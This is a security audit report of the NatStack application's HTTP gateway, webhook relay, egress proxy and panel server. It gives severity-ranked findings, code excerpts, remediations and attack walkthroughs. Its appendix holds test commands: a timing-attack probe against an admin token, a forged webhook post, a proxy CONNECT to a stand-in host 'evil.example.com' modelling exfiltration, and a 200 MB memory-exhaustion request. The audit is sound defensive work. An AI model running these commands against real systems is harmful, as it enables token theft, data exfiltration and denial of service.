# Audit 06 — HTTP Endpoints, Webhooks & External Surfaces

**Scope:** gateway, panel HTTP, RPC HTTP, webhook verifiers/relay, well-known app, push service, image service, meta service, audit service, OAuth callbacks, TLS pinning, egress proxy.

**Audit date:** 2026-04-23
**Branch:** `audit` (HEAD `bafe7bc8`)
**Reviewer:** automated security review

---

## Executive Summary

NatStack's external HTTP surface is **intentionally small** — a single-port TLS gateway multiplexes four namespaces (`/healthz`, `/rpc`, `/_w/`, `/_r/`, `/_git/`) plus panel HTML. Authentication is centered on a shared bearer admin token plus per-caller tokens managed by `TokenManager`. For WebSocket attachment NatStack has **solid** TLS-fingerprint pinning with a credible proof (bytes-on-wire test) that the app-layer token cannot leak to a mismatched peer.

That said, the audit found **several exploitable or latent weaknesses** that warrant remediation before a public-server deployment:

1. **Non-constant-time admin-token comparisons** on every hot path (gateway `/healthz`, `/_r/` admin routes, `RpcServer.validateAdminToken`, HTTP POST `/rpc`, panel management API). A remote attacker with accurate network latency can mount a timing side-channel attack against the 32-byte hex admin token. **Severity: High** when server is exposed beyond localhost.
2. **Webhook verifier registry is never wired into an ingress path.** There is no HTTP route that actually receives webhooks — the `webhookService` only manages subscriptions, and the `webhook-relay` Cloudflare Worker is a stub that blindly returns `{ received: true }` without signature verification, replay protection, or forwarding. **Severity: Critical-by-omission** — webhook ingestion is entirely unauthenticated.
3. **No timestamp/replay check on Slack signatures** (5-minute-window per Slack spec). GitHub HMAC verifier also has no timestamp, which matches GitHub's own design but means delivery-ID idempotency must be implemented elsewhere — it isn't. **Severity: High** for Slack, Medium for others.
4. **Permissive CORS with `Access-Control-Allow-Origin: *`** on `/api/panels` panel-management endpoint. Though Bearer-token gated and not `credentials: "include"`-sensitive, it advertises running panel subdomains/context IDs to any origin. **Severity: Low/Info.**
5. **Very permissive CSP on panels** (`script-src 'self' 'unsafe-inline' 'unsafe-eval'`, `connect-src … ws: wss: https:`) makes any XSS in a panel trivially escalate. **Severity: Medium** (accepted by design for panel runtime — should be documented).
6. **Host-header-derived `URL` construction** in `panelHttpServer.handleRequest` allows Host-header injection for logging/`req.url` side-effects — no direct exploit found, but documented below.
7. **Management API on panel HTTP server does not require auth when `managementToken` is null** (validateManagementAuth returns true). Any caller can enumerate running panels / context IDs. **Severity: Medium** in any non-Electron deployment.
8. **Gateway reverse-proxy to workerd (`/_w/`) and git (`/_git/`) is unauthenticated** at the gateway layer — these rely on the upstream services to enforce auth. workerd enforces per-worker tokens for DO dispatch, but `git` is guarded by `GitAuth` that relies on `Authorization` headers supplied by the client; a **missing Authorization header hits a 502/4xx at git-server, not a 401 at the gateway**. **Severity: Medium** (defense-in-depth gap).
9. **Egress proxy CONNECT tunnel (`EgressProxy.handleConnect`) has no provider-matching / consent check** — only requires the two attribution headers to be present. Any worker that can set those headers (which every worker can, via the proxy-auth wiring) tunnels arbitrary TLS traffic without consent enforcement, bypassing the capability/rate-limit/audit path that HTTP requests take. **Severity: High** if workers are untrusted.
10. **Audit log entries include full request URL** (including query strings, which for many providers carry access tokens). Log records are JSONL files; log injection is blocked by `JSON.stringify`, but secrets landing in logs is the real concern. **Severity: Medium.**
11. **Default `apple-app-site-association` path pattern `/oauth/callback/*`** and Android assetlinks don't yet have real fingerprints in `config.json` (TODO placeholders). A released build with placeholder values would bind universal links to no apps / wrong apps. **Severity: Build-time — blocker if shipped.**
12. **`/rpc` HTTP endpoint has a 200 MB body limit**, error responses return HTTP 200 with `{ error }` (semantic errors encoded in JSON — OK), but the **200MB cap is 200× typical bodies** and enables memory pressure / DoS. **Severity: Medium.**
13. **Panel error page renders the build error in a `<pre>` block**; `escapeHtml` escapes `<>"&` but NOT the single-quote `'`. An HTML attribute-context injection in an upstream concatenation could still be crafted. Not exploitable as written (error only ever appears in `<pre>`). **Severity: Info/hardening.**

No findings affect the core TLS-pinning implementation (`src/main/tlsPinning.ts`), which is correctly designed and tested.

---

## HTTP Surface Inventory

### Gateway (TLS) — `src/server/gateway.ts`

| Method | Path | Handler | Auth |
|---|---|---|---|
| GET | `/healthz` | inline | none for basic; admin token (`?token=` OR `X-NatStack-Token`) gates detailed fields |
| GET/WS | `/rpc` | `RpcServer.handleGatewayHttpRequest` / `handleGatewayWsConnection` | Bearer (HTTP) or `ws:auth` (WS) — admin token OR per-caller token |
| ANY | `/_w/*` | reverse proxy → workerd | none at gateway; workerd checks per-worker tokens |
| ANY | `/_r/w/<source>/...` | route lookup → workerd rewrite | route `auth` attr (public / admin-token) |
| ANY | `/_r/s/<service>/...` | in-proc service handler | route `auth` attr |
| ANY | `/_git/*` | reverse proxy → git server | none at gateway; upstream handles |
| other | `*` | `PanelHttpServer.handleGatewayRequest` | varies (see below) |

Upgrade path mirrors HTTP: `/rpc`, `/_w/`, `/_r/` with WS-enabled routes, and anything else goes to the panel HTTP upgrade handler (CDP bridge).

### Panel HTTP — `src/server/panelHttpServer.ts`

| Method | Path | Auth |
|---|---|---|
| GET | `/__loader.js` | none |
| GET | `/__transport.js` | none |
| GET | `/api/panels` | **Bearer (managementToken) IFF configured; otherwise allowed** |
| GET | `/favicon.ico`, `/favicon.svg` | none |
| GET | `/{source1}/{source2}/…` | none (panel build dispatch, public by design) |
| GET | `/` | none (index page listing panels) |

CORS on `/api/*`: `Access-Control-Allow-Origin: *`, `Allow-Methods: GET, OPTIONS`. No credentials allowed by default — but the `Authorization: Bearer` header is accepted.

### RPC HTTP — `src/server/rpcServer.ts`

| Method | Path | Auth |
|---|---|---|
| POST | `/rpc` | `Authorization: Bearer <token>` — admin token OR per-caller token (validated via `TokenManager`) |

### Webhook relay (Cloudflare Worker) — `apps/webhook-relay/src/index.ts`

| Method | Path | Auth |
|---|---|---|
| GET | `/health` | none |
| POST | `/webhook/{instanceId}/{providerId}` | **NONE — returns 200 and drops payload** |
| GET (upgrade) | `/ws/{…}` | **NONE — accepts any WebSocket** |

Wrangler config has `[vars] ENVIRONMENT = "production"` — no `[[kv_namespaces]]` or secrets. The relay is a scaffold; it does not actually verify or forward anything.

### Well-known app — `apps/well-known`

Cloudflare Worker serving a static site bucket. Exposes:
- `/.well-known/apple-app-site-association`
- `/.well-known/assetlinks.json`

Both generated at build time from `config.json` with placeholder values (`teamId: "XXXXXXXXXX"`, `sha256CertFingerprints: ["TODO:REPLACE_WITH_ACTUAL_FINGERPRINT"]`).

### Egress proxy (loopback only) — `src/server/services/egressProxy.ts`

Binds `127.0.0.1:ephemeral`. Workers and panels set it as their `HTTP_PROXY`. Accepts HTTP requests and CONNECT tunnels. Auth: `x-natstack-worker-id` + `x-natstack-proxy-auth` headers. HTTP requests undergo provider-routing → consent → capability → rate-limit → circuit-breaker. CONNECT tunnels **skip all provider checks**.

### Loopback PKCE (ephemeral) — `packages/shared/src/credentials/flows/loopbackPkce.ts`

Ephemeral `127.0.0.1:0` HTTP server, one path: `GET /callback`. Lifetime is one OAuth flow.

---

## Findings (severity-ordered)

### F-01 — HIGH — Non-constant-time admin-token comparison

**Files:**
- `packages/shared/src/tokenManager.ts:133` — `return this.adminToken !== null && token === this.adminToken;`
- `src/server/gateway.ts:88` — `if (params.get("token") === adminToken) detailed = true;`
- `src/server/gateway.ts:91` — `if (typeof headerToken === "string" && headerToken === adminToken) detailed = true;`
- `src/server/gateway.ts:317` — `return presented === adminToken;`
- `src/server/panelHttpServer.ts:538` — `return match?.[1] === this.managementToken;`
- `apps/webhook-relay/src/index.ts` — (N/A today; no auth)

**Attack:** on a public server, any remote client can measure response latency for `/healthz?token=<guess>` and incrementally recover the admin token byte by byte (string `===` aborts at the first mismatching byte in V8, typically giving a few nanoseconds differential per byte). A 32-byte hex token has 256 characters of search space; at ~1000 measurements per position, recovery is feasible within minutes on a LAN.

**Code snippet (gateway.ts:82–91):**
```ts
if (req.method === "GET" && (url === "/healthz" || url.startsWith("/healthz?"))) {
  let detailed = false;
  if (adminToken) {
    const qIdx = url.indexOf("?");
    if (qIdx !== -1) {
      const params = new URLSearchParams(url.slice(qIdx + 1));
      if (params.get("token") === adminToken) detailed = true;   // ← timing
    }
    const headerToken = req.headers["x-natstack-token"];
    if (typeof headerToken === "string" && headerToken === adminToken) detailed = true;  // ← timing
  }
```

Same shape appears in `enforceAuth`, in `TokenManager.validateAdminToken`, and in the panel management-API check. `validateToken` is fine (Map lookup, O(1) regardless of input).

**Remediation:** replace every admin-token compare with `crypto.timingSafeEqual` on Buffers of equal length, bail-early only on length mismatch. Wrap in a helper:
```ts
function safeEqual(a: string, b: string): boolean {
  if (a.length !== b.length) return false;
  return crypto.timingSafeEqual(Buffer.from(a), Buffer.from(b));
}
```
Apply at `tokenManager.ts:133`, `gateway.ts:88/91/317`, `panelHttpServer.ts:538`.

---

### F-02 — CRITICAL-by-omission — Webhook ingestion path does not exist / is unauthenticated

**Files:**
- `apps/webhook-relay/src/index.ts:23–35` — accepts `POST /webhook/{instanceId}/{providerId}` and returns `{ received: true }`, no forwarding, no HMAC check, no KV.
- `src/server/services/webhookService.ts` — manages subscriptions only; no HTTP handler.
- `packages/shared/src/webhooks/verifier.ts` — verifier library with **correct** `crypto.timingSafeEqual` usage for GitHub / Slack / Stripe, but never invoked from any ingress path.

**Attack:** if an integrator points a provider (GitHub, Stripe, Slack) at the webhook-relay's `POST /webhook/...`, the relay accepts and discards the payload, and never verifies the signature. The actual server has no `/webhook` route at all — `/_r/s/webhooks/...` is not registered in `webhookService.ts` (that service is RPC-only).

**Code snippet (apps/webhook-relay/src/index.ts:23–35):**
```ts
if (
  request.method === "POST" &&
  segments.length === 3 &&
  segments[0] === "webhook"
) {
  const [, instanceId, providerId] = segments;
  void env;
  void instanceId;
  void providerId;
  return json({ received: true });
}
```

**Remediation:**
1. Wire `WebhookVerifierRegistry` into a server-side route (e.g., service-route `/_r/s/webhooks/{providerId}` with `auth: "public"` so providers can reach it). Read raw body, look up subscription+secret by `providerId`+`subscriptionId`, call the verifier, then either fan-out via `eventService` or forward to a worker.
2. Flesh out the Cloudflare relay: require `Authorization: Bearer <relay-token>` (set via `wrangler secret put RELAY_TOKEN`, not `[vars]`), persist seen delivery IDs in KV for idempotency, and forward only after HMAC passes.
3. Reject requests older than the provider's replay window (Slack: 5 min; Stripe: 5 min default) using `Date.now() - timestampSec*1000`.

---

### F-03 — HIGH — No replay-window check on Slack/Stripe verifiers

**File:** `packages/shared/src/webhooks/verifier.ts:67–119`

`slackSignatureV0` and `stripeSignature` extract `timestamp` but never compare it to `Date.now()`. A leaked payload-plus-signature pair can be replayed indefinitely.

**Code snippet:**
```ts
export const slackSignatureV0: WebhookVerifier = (payload, headers, secret) => {
  const signature = getHeader(headers, "x-slack-signature");
  const timestamp = getHeader(headers, "x-slack-request-timestamp");
  if (!signature || !timestamp) return false;
  const baseString = `v0:${timestamp}:${…}`;
  const expected = `v0=${crypto.createHmac("sha256", secret).update(baseString).digest("hex")}`;
  // ← No check that timestamp is within REPLAY_WINDOW of now
```

**Attack:** adversary with network access to an old webhook delivery can replay it weeks later to re-trigger the server-side handler (e.g., re-invoke a "payment succeeded" handler).

**Remediation:** require `Math.abs(nowSec - Number(timestamp)) <= 300` (Slack spec). Also add per-delivery nonce tracking: store seen delivery IDs (GitHub: `X-GitHub-Delivery`, Stripe: `idempotency_key`, Slack: the timestamp) in a short-TTL cache (5 min) and reject duplicates.

---

### F-04 — HIGH — Egress proxy CONNECT tunnel bypasses consent/capability

**File:** `src/server/services/egressProxy.ts:274–336`

`handleConnect` only checks that `WORKER_ID_HEADER` and `PROXY_AUTH_HEADER` are present. It does not route through `routeProvider`, `authorizeRequest`, rate limiter, or circuit breaker. Any worker that the proxy trusts to set those two headers can open an arbitrary TLS tunnel (e.g., to `evil.example.com:443`).

**Code snippet (egressProxy.ts:274–320):**
```ts
private async handleConnect(req: IncomingMessage, socket: Duplex, _head: Buffer): Promise<void> {
  const startedAt = Date.now();
  const attribution = this.attributeRequest(req);          // ← only checks headers
  const authority = req.url ?? "";
  const [host, portStr] = authority.split(":");
  const port = parseInt(portStr || "443", 10);
  // ← no provider match, no consent, no capability, no rate limit, no breaker
  const upstream = netConnect(port, host || authority, () => {
    socket.write("HTTP/1.1 200 Connection Established\r\n\r\n");
    ...
  });
```

**Attack scenarios:**
- Untrusted worker exfiltrates data to a non-provider domain via HTTPS — the plaintext never touches the proxy so capability lists can't apply; provider routing on CONNECT is inherently limited to hostname, but no such routing is even attempted.
- Rate-limits bypass — CONNECT tunnels don't consume any bucket.

**Remediation:**
1. Perform `routeProvider` on the CONNECT authority (host+port → provider manifest's `apiBase` host match).
2. Require a consent grant for the matched provider; reject if none.
3. Apply rate limiting and circuit breaker on the CONNECT call.
4. Alternatively, if NatStack's threat model trusts all local workers, document that workers are equivalent to the local user.

---

### F-05 — MEDIUM — Management API auth bypass when `managementToken` is unset

**File:** `src/server/panelHttpServer.ts:533–539`

```ts
private validateManagementAuth(req: import("http").IncomingMessage): boolean {
  if (!this.managementToken) return true;   // ← open when not configured
  const auth = req.headers.authorization;
  if (!auth) return false;
  const match = auth.match(/^Bearer\s+(.+)$/i);
  return match?.[1] === this.managementToken;   // ← non-constant-time
}
```

The constructor signature is `managementToken?: string`, and nothing in the standalone path forces it to be set. `GET /api/panels` leaks running panels (titles, `source`, `subdomain`, `parentId`, `contextId`) — enough to map the live runtime.

**Remediation:** default-deny: if `managementToken` is null, treat the request as unauthorized OR refuse to register the `/api/` routes at all. Fix the constant-time compare while you're here.

---

### F-06 — MEDIUM — Gateway reverse-proxy (`/_w/`, `/_git/`) has no gateway-level auth

**File:** `src/server/gateway.ts:102–123`

```ts
// /_w/ → workerd reverse proxy
if (url.startsWith("/_w/") && workerdPort) {
  return proxyRequest(req, res, workerdPort, url);
}
...
// /_git/ → git server reverse proxy
if (url.startsWith("/_git/") && gitPort) {
  const gitPath = url.slice(5);
  return proxyRequest(req, res, gitPort, gitPath);
}
```

Upstream (workerd, git) enforces its own auth — but:
- If an upstream service has an auth bug (e.g., an unprotected endpoint), the gateway happily relays it.
- The gateway forwards all headers including `Host` (unchanged unless caller overrides via the optional `hostHeader` argument, which is never passed). Host-based virtual-host dispatch in workerd may be confused by a caller-supplied Host (see F-10).
- `proxyRequest` forwards 502 errors opaquely, including upstream stack traces if the upstream leaks them.

**Remediation:** defense-in-depth — require the admin token on all `/_w/` and `/_git/` paths that are not explicitly whitelisted for public reach. If that breaks legitimate flows, at minimum enforce a same-origin `Referer`/`Origin` check for browser-origin requests.

---

### F-07 — MEDIUM — Audit log URL field captures query-string secrets

**File:** `src/server/services/egressProxy.ts:254–270`

The audit entry serialized to `~/.natstack/logs/credentials-audit-YYYY-MM-DD.jsonl` carries:
```ts
url: targetUrl?.toString() ?? (req.url ?? ""),
```
Many OAuth and API flows put bearer tokens in query strings (`?api_key=…`, `?access_token=…`, legacy providers). The audit log is not encrypted and is stored in the user's home directory with default permissions.

**Attack:** local user-level compromise (not root) → read logs → extract API keys.

**Remediation:** strip/redact sensitive query parameters before audit. Maintain a denylist (`access_token`, `api_key`, `token`, `key`, `secret`, `password`, `code`, `state`) and rewrite the URL to `?access_token=REDACTED` before writing. Consider also redacting path segments that look like JWTs.

---

### F-08 — MEDIUM — Panel CSP is permissive; panel XSS → RCE-equivalent

**File:** `packages/shared/src/constants.ts:32–48`

```ts
"script-src 'self' 'unsafe-inline' 'unsafe-eval' https: http://localhost:* http://127.0.0.1:*",
"connect-src 'self' ws://127.0.0.1:* wss://127.0.0.1:* http://127.0.0.1:* https://127.0.0.1:* ws://localhost:* wss://localhost:* http://localhost:* https://localhost:* ws: wss: https:"
```

`script-src 'unsafe-inline' 'unsafe-eval' https:` + `connect-src https:` means any stored XSS in a panel can:
1. Load and execute code from any `https://` origin (no SRI).
2. Make WS/HTTPS connections to any host to exfiltrate local data (the panel also holds a per-panel token with `/rpc` reach).

Given panels render user-authored markdown, user-editable workspaces, and LLM output, XSS is a realistic vector.

**Remediation (tradeoff):** drop `'unsafe-eval'` where the adapter permits (modern React builds don't need it). Scope `connect-src` to the gateway host + explicit provider API bases. Replace `https:` fallback with an allowlist built from active provider manifests. If dynamic eval is required for the runtime (the worker CSP path does need it), keep it for workers but not panels.

---

### F-09 — MEDIUM — 200 MB body cap on POST `/rpc` enables DoS

**File:** `src/server/rpcServer.ts:840`

```ts
const MAX_BODY_SIZE = 200 * 1024 * 1024; // 200MB
```

Any authenticated caller (admin OR per-caller token) can PUT 200 MB of bytes per request — buffered entirely in memory (`chunks` array) — before JSON.parse. A handful of concurrent clients exhausts memory.

**Remediation:** lower default to 8–16 MB (typical RPC payloads are < 1 MB), allow opt-in streaming for image/file services that use binary envelopes, and cap *total in-flight bytes* across all connected clients (not just per-request).

---

### F-10 — LOW — Host-header trust in `panelHttpServer`

**File:** `src/server/panelHttpServer.ts:356–358`

```ts
const url = new URL(req.url ?? "/", `http://${req.headers.host ?? "localhost"}`);
const pathname = url.pathname;
const subdomain = extractSubdomain(req.headers.host ?? "", this.externalHost);
```

The Host header is attacker-controlled. `extractSubdomain` regexes against `externalHost`, which is safe against absurd hosts (returns null). But:
- If a future change logs `url.toString()`, an attacker-controlled host ends up in logs (log-spoofing / phishing link injection).
- If a future reverse proxy cares about `Host`, mismatches can route requests to unexpected panel subdomains.

**Remediation:** validate Host header against an allowlist (the configured `externalHost` + its legitimate subdomains) before using it for anything other than subdomain extraction.

---

### F-11 — LOW — Panel index leaks panel source registry without auth

**File:** `src/server/panelHttpServer.ts:699–759`

The `GET /` index page emits HTML listing every `sourceRegistry` entry plus every running panel's `contextId` and title. Context IDs are random 8-byte identifiers used in subsequent panel URLs. Disclosure is not itself a flaw (context IDs are not secrets), but it advertises the runtime topology to arbitrary visitors.

**Remediation:** require the admin/management token for `/` when `bindHost` is not loopback (match the Host-bound or opt-in behavior already present for `/api/panels`).

---

### F-12 — LOW — `/healthz` detailed response leaks version/uptime

**File:** `src/server/index.ts:987–999`

The token-gated branch leaks `version: "0.1.0"`, `uptimeMs`, and `tokenSource`. With the F-01 timing attack, an attacker can use `/healthz?token=…` as the measurable oracle: response body is **uniformly sized for both branches** (good) but status header writes differ by the token comparison branch — same timing signal as F-01.

**Remediation:** fix F-01.

---

### F-13 — LOW — `escapeHtml` in `panelHttpServer` does not escape `'`

**File:** `src/server/panelHttpServer.ts:118–121`

```ts
function escapeHtml(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}
```

No `'` → `&#39;`. All current call sites use the output inside `"..."` attributes or element text, so this is latent. Any future change placing output inside single-quoted attributes would be vulnerable.

**Remediation:** also escape `'`. Cheap, documentation-reducing.

---

### F-14 — LOW — Reconnection error exposes admin-token via `redactTokenIn`

**File:** `src/main/serverClient.ts:162, 240`

`redactTokenIn(err.message, adminToken)` is invoked with the token as the redaction key. If `redactTokenIn` does a naive `indexOf` scan, it works — but if the error is not a string or contains the token in a slightly re-encoded form, redaction silently fails.

This is only a concern on the *client* side (console-log), not the server, but any user shipping their logs to a crash-reporter would leak the token. Out of scope for this audit but noted.

---

### F-15 — INFO — Well-known app ships with placeholder fingerprints

**File:** `apps/well-known/config.json`

```json
{
  "android": { "sha256CertFingerprints": ["TODO:REPLACE_WITH_ACTUAL_FINGERPRINT"] }
}
```

Shipping a public build with this file broken means universal links won't bind to any real app — but worse, if the file is published once with real fingerprints and later overwritten with TODOs by a misconfigured CI, every Android app-handoff breaks silently.

**Remediation:** fail the build if the fingerprint array contains `TODO` or placeholder values. Easy 5-line guard in `apps/well-known/build.ts`.

---

### F-16 — INFO — Gateway proxy surfaces upstream errors verbatim

**File:** `src/server/gateway.ts:252–255`

```ts
proxyReq.on("error", (err) => {
  if (!res.headersSent) {
    res.writeHead(502, { "Content-Type": "text/plain" });
  }
  res.end(`Gateway proxy error: ${err.message}`);
});
```

`err.message` from `http.request` includes the upstream target IP and port (`connect ECONNREFUSED 127.0.0.1:12345`). This is a local-only detail leak in standalone deployments where the gateway is reachable publicly.

**Remediation:** in production, return a generic `502 Bad Gateway` body; log details server-side.

---

### F-17 — INFO — `RpcServer.handleHttpRequest` returns HTTP 200 for errors

**File:** `src/server/rpcServer.ts:882–887`

```ts
} catch (err: any) {
  res.writeHead(200, { "Content-Type": "application/json" });
  res.end(JSON.stringify({ error: err.message, errorCode: err.code }));
}
```

Unhandled service errors get a 200 with `{ error }`. Middleware that inspects HTTP status for errors (WAF, load balancer) will count these as success — obscuring service-layer failures. Error messages are `err.message`, which for some errors includes code paths / sqlite strings / provider API responses.

**Remediation:** use 4xx for client errors, 5xx for unexpected internal errors; sanitize messages before echoing.

---

### F-18 — INFO — No Strict-Transport-Security / X-Content-Type-Options / Referrer-Policy

None of the serves (gateway, panelHttp, rpc) emits:
- `Strict-Transport-Security` (relevant when TLS is on)
- `X-Content-Type-Options: nosniff`
- `Referrer-Policy: no-referrer` or stricter
- `Permissions-Policy`

On the HTML-producing paths (panelHttpServer), `X-Frame-Options: DENY` or `frame-ancestors` CSP directive is also absent — panels can be iframed by any origin.

**Remediation:** add a single `writeSecurityHeaders(res)` helper and call it from every HTML/JSON response path. Baseline:
```ts
res.setHeader("X-Content-Type-Options", "nosniff");
res.setHeader("Referrer-Policy", "no-referrer");
res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
res.setHeader("Permissions-Policy", "geolocation=(), microphone=(), camera=()");
// For HTML:
res.setHeader("X-Frame-Options", "DENY");
```
(`X-Frame-Options` should be kept even though the CSP injects `frame-ancestors` — belt and braces for old browsers.)

---

## Positive Findings (things done right)

- **TLS fingerprint pinning** (`src/main/tlsPinning.ts`): correct design. Fingerprint comparison happens in `secureConnect` before any user-level write; `rejectUnauthorized: false` is paired with `checkServerIdentity: () => undefined` and a factory-installed `createConnection` so SNI-on-IP quirk is handled. Bytes-on-wire test (`serverClient.tls.test.ts:135–187`) confirms `ws:auth` never reaches a mismatched peer.
- **OAuth state/code verification** (`loopbackPkce.ts:111`, `authFlowService.ts:87`): state nonce and PKCE code verifier are cryptographically random, lengths 16/32 bytes respectively. Callback path mismatch rejected (`authFlowService.ts:80–82`).
- **Webhook verifiers** (`packages/shared/src/webhooks/verifier.ts`): GitHub/Slack/Stripe use `crypto.timingSafeEqual` correctly with length check. Multi-signature Stripe handled.
- **Egress proxy HTTP path** (`egressProxy.ts:148–271`): full pipeline consent → capability → rate limit → circuit breaker → audit.
- **Gateway route authorization enforcement** (`gateway.ts:308–318`): service-route and worker-route lookups respect the declared `auth: admin-token` attribute. (Timing-leak modulo F-01.)
- **Per-caller token revocation** (`rpcServer.ts:189–194`): revoking a token force-closes the live WS with code `4001`.
- **Panel-to-panel relay auth** (`rpcServer.ts:944–964`): panel callers can only relay to their parent/descendant panels, not arbitrary other panels.

---

## Attack Walkthroughs

### Walkthrough 1 — remote timing attack on admin token
1. Attacker knows the server URL (`https://server.example.com:8080`).
2. Repeatedly `GET /healthz?token=<candidate>` with varying first-byte candidates.
3. Measure TCP-to-response-body latency. When the first candidate byte matches, the string comparison enters its second iteration → tiny but measurable latency delta.
4. Repeat 32 × 16 times to recover the 32-byte hex token.
5. Attacker now has admin token → POST `/rpc` with `Authorization: Bearer <admin>` → full service dispatch → read credentials, trigger builds, invoke any service.

**Mitigated by F-01 remediation.**

### Walkthrough 2 — webhook-relay passthrough
1. Attacker gets a victim to configure their GitHub repo to POST to `https://victim-relay.workers.dev/webhook/i/gh`.
2. Every delivery returns `{ received: true }` and is black-holed.
3. Legitimate automation breaks silently (DoS by integration) AND attacker has confirmed the relay is unowned — they set up their own relay at the same path, host it on a lookalike domain, and harvest real webhook payloads (which include the repository data the hook subscribed to).

**Mitigated by F-02 remediation.**

### Walkthrough 3 — CONNECT-tunnel exfiltration
1. Untrusted worker is installed (perhaps from a plugin marketplace).
2. Worker sets `HTTP_PROXY=http://127.0.0.1:<egressPort>` and `x-natstack-worker-id` + `x-natstack-proxy-auth` headers.
3. Worker issues `CONNECT evil.example.com:443`.
4. Egress proxy opens raw TLS tunnel to evil.example.com without any consent check. Worker exfiltrates arbitrary data.

**Mitigated by F-04 remediation.**

---

## Remediation Priority Matrix

| Priority | Finding | Work |
|---|---|---|
| P0 (blocker for public exposure) | F-01 (timing), F-02 (webhook route), F-04 (CONNECT) | 1 day |
| P1 | F-03 (replay), F-05 (mgmt auth default-deny), F-07 (audit redaction) | 1 day |
| P2 | F-06 (gateway-level auth), F-08 (panel CSP), F-09 (body size) | 2–3 days |
| P3 | F-10 — F-18 (hardening) | 1 day |

---

## Appendix A — Files Reviewed

- `src/server/gateway.ts`
- `src/server/publicUrl.ts`
- `src/server/rpcServer.ts`
- `src/server/panelHttpServer.ts`
- `src/server/routeRegistry.ts`
- `src/server/rpcServiceWithRoutes.ts`
- `src/server/services/webhookService.ts`
- `src/server/services/pushService.ts`
- `src/server/services/imageService.ts` (+ `imageService.test.ts`)
- `src/server/services/notificationService.ts`
- `src/server/services/metaService.ts` (+ `metaService.test.ts`)
- `src/server/services/auditService.ts`
- `src/server/services/egressProxy.ts`
- `src/server/services/authFlowService.ts`
- `src/server/services/credentialService.ts`
- `src/server/services/oauthProviders/codexTokenProvider.ts`
- `src/server/index.ts`
- `src/main/tlsPinning.ts`
- `src/main/serverClient.ts` / `serverClient.tls.test.ts`
- `apps/webhook-relay/src/index.ts`
- `apps/webhook-relay/wrangler.toml`
- `apps/well-known/build.ts`
- `apps/well-known/wrangler.toml`
- `apps/well-known/config.json`
- `apps/well-known/src/*.template.json`
- `packages/shared/src/webhooks/verifier.ts` (+ test)
- `packages/shared/src/webhooks/subscription.ts`
- `packages/shared/src/webhooks/types.ts`
- `packages/shared/src/credentials/audit.ts`
- `packages/shared/src/credentials/types.ts`
- `packages/shared/src/credentials/flows/loopbackPkce.ts`
- `packages/shared/src/tokenManager.ts`
- `packages/shared/src/constants.ts`
- `packages/shared/src/hostConfig.ts`

## Appendix B — Quick test commands to verify findings

F-01 (timing):
```sh
for i in $(seq 1 1000); do
  curl -s -w "%{time_total}\n" -o /dev/null \
    "https://SERVER/healthz?token=$(head -c 64 /dev/urandom | base64 | head -c 32)"
done | sort -n
```
Consistent low-variance output → indicates token gate is running. Then measure `a000…` vs `z000…` byte 0 candidates; delta in microseconds per byte is the signal.

F-02 (webhook stub):
```sh
curl -X POST https://RELAY.workers.dev/webhook/abc/github \
  -H "X-Hub-Signature-256: sha256=bogus" \
  -d '{"malformed":"true"}'
# → {"received":true}   — accepted without verification
```

F-04 (CONNECT bypass):
```sh
curl -x http://127.0.0.1:EGRESS_PORT \
  -H "x-natstack-worker-id: any" \
  -H "x-natstack-proxy-auth: any" \
  https://evil.example.com/
# → upstream body returned without consent check
```

F-09 (body size):
```sh
head -c 200000000 /dev/urandom | curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data-binary @- https://SERVER/rpc
# → memory pressure on server
```
